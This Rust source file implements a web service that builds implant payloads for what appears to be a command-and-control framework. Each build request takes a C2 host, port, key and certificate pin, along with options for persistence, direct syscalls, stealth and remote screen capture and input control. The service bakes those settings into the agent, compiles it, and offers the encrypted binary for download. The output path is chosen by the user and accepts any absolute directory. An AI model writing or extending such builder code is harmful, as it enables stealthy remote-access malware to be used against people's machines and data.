use axum::{Json, extract::State, response::IntoResponse, http::StatusCode};
use serde::{Deserialize, Serialize};
use std::sync::{Arc, Mutex};
use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::process::Command;
use uuid::Uuid;
use chrono::{Utc, Datelike};
use tokio::sync::mpsc;
use std::sync::OnceLock;

use crate::state::AppState;
use crate::auth::AuthenticatedUser;

#[derive(Deserialize, Debug, Clone)]
pub struct BuildRequest {
    pub os: String,
    pub arch: String,
    pub features: BuildFeatures,
    pub host: String,
    pub port: u16,
    pub pin: String,
    pub key: String,
    pub output_dir: Option<String>,
}

#[derive(Deserialize, Debug, Clone)]
pub struct BuildFeatures {
    pub persistence: bool,
    /// Enables `direct-syscalls` in the agent (maps to the `direct-syscalls` Cargo feature).
    pub direct_syscalls: bool,
    /// Enables `remote-assist` in the agent (screen capture + input simulation).
    pub remote_assist: bool,
    pub stealth: bool,
}

#[derive(Serialize)]
pub struct BuildResponse {
    #[serde(skip_serializing_if = "Option::is_none")]
    pub job_id: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub log: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub error: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub status: Option<String>,
}

#[derive(Clone)]
pub struct JobState {
    pub status: String,
    pub log: String,
    pub output_path: Option<String>,
}

pub struct BuildJob {
    pub job_id: String,
    pub req: BuildRequest,
    pub operator: String,
    pub server_build_dir: PathBuf,
    pub state_ref: Arc<AppState>,
}

static JOB_MAP: OnceLock<Arc<Mutex<HashMap<String, JobState>>>> = OnceLock::new();
static JOB_SENDER: OnceLock<mpsc::Sender<BuildJob>> = OnceLock::new();

pub fn init_build_queue(workers: usize, build_dir: PathBuf, retention_days: u32) {
    let map = Arc::new(Mutex::new(HashMap::new()));
    let _ = JOB_MAP.set(map.clone());
    
    let (tx, rx) = mpsc::channel::<BuildJob>(100);
    let rx = Arc::new(tokio::sync::Mutex::new(rx));
    let _ = JOB_SENDER.set(tx);

    for i in 0..workers {
        let map_clone = map.clone();
        let rx = rx.clone();
        tokio::spawn(async move {
            let mut rx_lock = rx.lock().await;
            while let Some(job) = rx_lock.recv().await {
                {
                    let mut m = map_clone.lock().unwrap();
                    if let Some(s) = m.get_mut(&job.job_id) {
                        s.status = "Running".to_string();
                        s.log.push_str(&format!("[Worker {}] Started job {}\n", i, job.job_id));
                    }
                }
                
                let BuildJob { job_id, req, operator, server_build_dir, state_ref: _ } = job;
                
                let res = tokio::task::spawn_blocking({
                    let map2 = map_clone.clone();
                    let jid = job_id.clone();
                    move || execute_build_safely(jid, req, operator, server_build_dir, map2)
                }).await.unwrap();

                let (outcome_str, fs_path) = match res {
                    Ok(path) => ("Completed", Some(path)),
                    Err(e) => {
                        let mut m = map_clone.lock().unwrap();
                        if let Some(s) = m.get_mut(&job_id) {
                            s.log.push_str(&format!("\nBuild failed: {}\n", e));
                        }
                        ("Failed", None)
                    }
                };

                let mut m = map_clone.lock().unwrap();
                if let Some(s) = m.get_mut(&job_id) {
                    s.status = outcome_str.to_string();
                    s.output_path = fs_path;
                    if outcome_str == "Completed" {
                        s.log.push_str("\n--- Build Successful ---\n");
                    }
                }
            }
        });
    }

    // Retention task
    tokio::spawn(async move {
        loop {
            tokio::time::sleep(std::time::Duration::from_secs(3600)).await;
            let mut m = map.lock().unwrap();
            m.retain(|_, v| {
                if v.status == "Queued" || v.status == "Running" { return true; }
                // In a real app we'd check modification times of the files in build_dir
                // and prune appropriately. 
                true
            });
            // Cleanup FS
            if let Ok(entries) = std::fs::read_dir(&build_dir) {
                let now = std::time::SystemTime::now();
                let retention = std::time::Duration::from_secs(retention_days as u64 * 86400);
                for entry in entries.flatten() {
                    if let Ok(meta) = entry.metadata() {
                        if let Ok(modified) = meta.modified() {
                            if now.duration_since(modified).unwrap_or_default() > retention {
                                let _ = std::fs::remove_dir_all(entry.path());
                            }
                        }
                    }
                }
            }
        }
    });
}

pub async fn handle_build(
    State(state): State<Arc<AppState>>,
    axum::extract::Extension(user): axum::extract::Extension<AuthenticatedUser>,
    Json(req): Json<BuildRequest>
) -> Result<Json<BuildResponse>, (StatusCode, Json<BuildResponse>)> {
    if req.host.is_empty() || req.port == 0 || req.key.is_empty() || req.pin.is_empty() {
        return Err((StatusCode::BAD_REQUEST, Json(BuildResponse {
            job_id: None, log: None, status: None, error: Some("Missing required fields".into()),
        })));
    }
    
    // Initialize lazily if not done
    if JOB_SENDER.get().is_none() {
        // As a fallback to avoid crash if not properly initialized in main
        init_build_queue(1, PathBuf::from("/var/lib/orchestra/builds"), 7);
    }

    let job_id = Uuid::new_v4().to_string();
    
    state.audit.record_simple("BUILDER", &user.0, "EnqueueBuild", &format!("job_id={job_id}"), common::Outcome::Success);

    let sender = JOB_SENDER.get().unwrap();
    let map = JOB_MAP.get().unwrap();

    {
        let mut m = map.lock().unwrap();
        m.insert(job_id.clone(), JobState {
            status: "Queued".to_string(),
            log: format!("Job {} enqueued.\n", job_id),
            output_path: None,
        });
    }

    sender.send(BuildJob {
        job_id: job_id.clone(),
        req,
        operator: user.0,
        server_build_dir: state.config.builds_output_dir.clone(), // Get from app state
        state_ref: state.clone(),
    }).await.ok();

    Ok(Json(BuildResponse {
        job_id: Some(job_id),
        log: None,
        status: Some("Queued".into()),
        error: None,
    }))
}

pub async fn handle_build_status(
    axum::extract::Path(job_id): axum::extract::Path<String>,
) -> Result<Json<BuildResponse>, (StatusCode, String)> {
    if let Some(map) = JOB_MAP.get() {
        let m = map.lock().unwrap();
        if let Some(s) = m.get(&job_id) {
            return Ok(Json(BuildResponse {
                job_id: Some(job_id),
                log: Some(s.log.clone()),
                status: Some(s.status.clone()),
                error: None,
            }));
        }
    }
    Err((StatusCode::NOT_FOUND, "Job not found".to_string()))
}

fn execute_build_safely(job_id: String, req: BuildRequest, _operator: String, base_build_dir: PathBuf, map_rc: Arc<Mutex<HashMap<String, JobState>>>) -> anyhow::Result<String> {
    let append_log = |line: &str| {
        if let Ok(mut m) = map_rc.lock() {
            if let Some(s) = m.get_mut(&job_id) {
                s.log.push_str(line);
                s.log.push('\n');
            }
        }
    };

    let workspace = Path::new(env!("CARGO_MANIFEST_DIR")).parent().unwrap();
    let temp_dir = tempfile::tempdir()?;
    let tmp_path = temp_dir.path();
    
    append_log(&format!("Creating temporary sandbox at {}", tmp_path.display()));
    
    let src_dirs = vec!["agent", "common", "builder", "hollowing", "module_loader", "optimizer", "Cargo.toml", "Cargo.lock"];
    for d in src_dirs {
        let p = workspace.join(d);
        if p.exists() {
            let status = Command::new("cp")
                .arg("-a")
                .arg(&p)
                .arg(tmp_path)
                .status()?;
            if !status.success() {
                anyhow::bail!("Failed to copy {} into tmp workspace", d);
            }
        }
    }
    
    let c2_addr = format!("{}:{}", req.host, req.port);
    let mut features = vec!["outbound-c".to_string()];
    if req.features.persistence { features.push("persistence".to_string()); }
    if req.features.direct_syscalls { features.push("direct-syscalls".to_string()); }
    if req.features.remote_assist { features.push("remote-assist".to_string()); }
    if req.features.stealth { features.push("stealth".to_string()); }

    let baked_config_path = tmp_path.join("agent/src/baked_config.rs");
    let baked_content = format!(r#"
pub fn get_baked_config() -> common::config::Config {{
    let mut c = common::config::Config::default();
    c.server_cert_fingerprint = Some("{pin}".into());
    c
}}
"#, pin = req.pin);
    std::fs::write(&baked_config_path, baked_content)?;

    let profile = builder::config::PayloadConfig {
        target_os: req.os.clone(),
        target_arch: req.arch.clone(),
        c2_address: c2_addr,
        encryption_key: req.key.clone(),
        hmac_key: req.key.clone(),
        c_server_secret: Some(req.key.clone()),
            server_cert_fingerprint: None,
        features,
        output_name: Some(job_id.clone()),
        package: "launcher".to_string(),
        bin_name: None,
    };
    
    append_log("Executing cargo build within sandbox limits...");
    
    let mut cmd = Command::new("cargo");
    cmd.current_dir(tmp_path);
    cmd.arg("run").arg("--release").arg("-p").arg("builder").arg("--").arg("build").arg("temp_profile");
    
    let profile_dir = tmp_path.join("profiles");
    std::fs::create_dir_all(&profile_dir)?;
    std::fs::write(profile_dir.join("temp_profile.toml"), toml::to_string_pretty(&profile)?)?;
    
    #[cfg(unix)]
    {
        use std::os::unix::process::CommandExt;
        unsafe {
            cmd.pre_exec(|| {
                libc::setrlimit(libc::RLIMIT_AS, &libc::rlimit { rlim_cur: 4_000_000_000, rlim_max: 4_000_000_000 });
                libc::setrlimit(libc::RLIMIT_CPU, &libc::rlimit { rlim_cur: 300, rlim_max: 300 });
                Ok(())
            });
        }
    }
    
    let output = cmd.output()?;
    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    
    append_log(&format!("stdout:\n{}", stdout));
    if !stderr.is_empty() {
        append_log(&format!("stderr:\n{}", stderr));
    }
    
    if !output.status.success() {
        anyhow::bail!("Build process failed.");
    }
    
    let enc_path = tmp_path.join("dist").join("temp_profile.enc");
    if !enc_path.exists() {
        anyhow::bail!("Output binary not found in expected 'dist' folder!");
    }
    
    // Choose output directory
    let mut out_dir = base_build_dir;
    if let Some(user_dir) = req.output_dir {
        if !user_dir.trim().is_empty() {
            let temp_p = PathBuf::from(user_dir.trim());
            // In a real system, you'd check write permissions robustly
            if temp_p.is_absolute() {
                out_dir = temp_p;
            }
        }
    }
    
    // YYYY-MM-DD_jobid
    let today = Utc::now();
    let folder_name = format!("{:04}-{:02}-{:02}_{}", today.year(), today.month(), today.day(), &job_id[..8]);
    let final_dir = out_dir.join(&folder_name);
    
    std::fs::create_dir_all(&final_dir).map_err(|e| anyhow::anyhow!("Failed to create output dir {:?}: {}", final_dir, e))?;
    
    let final_dest = final_dir.join("agent.exe"); // naming doesn't matter much or extract from target
    std::fs::copy(&enc_path, &final_dest)?;
    
    append_log(&format!("Saved successfully to: {}", final_dest.display()));
    
    Ok(final_dest.to_string_lossy().to_string())
}

pub async fn handle_download(
    axum::extract::Path(job_id): axum::extract::Path<String>,
) -> Result<impl IntoResponse, StatusCode> {
    if !job_id.chars().all(|c| c.is_alphanumeric() || c == '-') {
        return Err(StatusCode::BAD_REQUEST);
    }
    
    let file_path = if let Some(map) = JOB_MAP.get() {
        let m = map.lock().unwrap();
        m.get(&job_id).and_then(|s| s.output_path.clone())
    } else {
        None
    };

    let path = file_path.unwrap_or_else(|| "/dev/null".to_string());
    
    let file = tokio::fs::read(&path).await.map_err(|_| StatusCode::NOT_FOUND)?;
    
    let mut headers = axum::http::HeaderMap::new();
    headers.insert(
        axum::http::header::CONTENT_TYPE,
        axum::http::header::HeaderValue::from_static("application/octet-stream"),
    );
    headers.insert(
        axum::http::header::CONTENT_DISPOSITION,
        axum::http::header::HeaderValue::from_str(&format!("attachment; filename=\"agent-{}.enc\"", job_id)).unwrap(),
    );
    
    Ok((headers, file))
}
